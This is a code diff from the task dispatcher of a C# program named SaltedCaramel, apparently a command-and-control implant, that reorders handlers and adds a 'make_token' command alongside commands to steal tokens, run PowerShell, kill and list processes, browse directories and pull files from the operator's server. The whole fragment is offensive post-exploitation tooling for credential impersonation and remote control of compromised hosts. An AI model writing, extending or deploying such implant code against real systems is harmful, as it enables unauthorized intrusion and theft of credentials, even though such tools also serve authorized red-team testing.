@@ -58,21 +58,21 @@ namespace SaltedCaramel
                 Debug.WriteLine("[-] DispatchTask - Tasked to kill PID " + this.@params);
                 Kill.Execute(this);
             }
-            else if (this.command == "upload")
-            {
-                Debug.WriteLine("[-] DispatchTask - Tasked to get file from server");
-                Upload.Execute(this, implant);
-            }
-            else if (this.command == "ps")
-            {
-                Debug.WriteLine("[-] DispatchTask - Tasked to list processes");
-                ProcessList.Execute(this);
-            }
             else if (this.command == "ls")
             {
                 string path = this.@params;
                 Debug.WriteLine("[-] DispatchTask - Tasked to list directory " + path);
                 DirectoryList.Execute(this, implant);
+            }
+            else if (this.command == "make_token")
+            {
+                Debug.WriteLine("[-] DispatchTask - Tasked to make a token for " + this.@params.Split(' ')[0]);
+                Token.Execute(this);
+            }
+            else if (this.command == "ps")
+            {
+                Debug.WriteLine("[-] DispatchTask - Tasked to list processes");
+                ProcessList.Execute(this);
             }
             else if (this.command == "powershell")
             {
@@ -124,6 +124,11 @@ namespace SaltedCaramel
             {
                 Debug.WriteLine("[-] DispatchTask - Tasked to steal token");
                 Token.Execute(this);
+            }
+            else if (this.command == "upload")
+            {
+                Debug.WriteLine("[-] DispatchTask - Tasked to get file from server");
+                Upload.Execute(this, implant);
             }
 
             this.SendResult(implant);
